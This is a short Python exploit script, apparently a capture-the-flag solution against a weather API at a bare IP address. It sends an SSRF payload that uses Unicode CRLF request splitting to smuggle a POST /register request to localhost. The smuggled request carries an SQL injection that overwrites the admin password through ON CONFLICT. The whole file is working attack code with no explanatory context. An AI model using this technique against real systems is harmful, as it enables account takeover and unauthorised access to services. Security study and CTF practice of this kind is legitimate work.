import requests
import urllib.parse as ps
url = "http://94.237.55.43:51883/api/weather"
username = "admin"
password = "abc') ON CONFLICT(username) DO UPDATE SET password = '5';--"

parsedUser = username
parsedPass = ps.quote(password)
contentLength = len(parsedUser) + len(parsedPass) + 19


test = "localhost/abc\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010A"
test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A\u010D\u010A"
test = test + f"username={parsedUser}&password={parsedPass}" + "\u010D\u010A\u010D\u010AGET\u0120/?q="
 
r = requests.post(url = url, json={'endpoint': test, 'city': 'Da Nang','country': 'VN'})
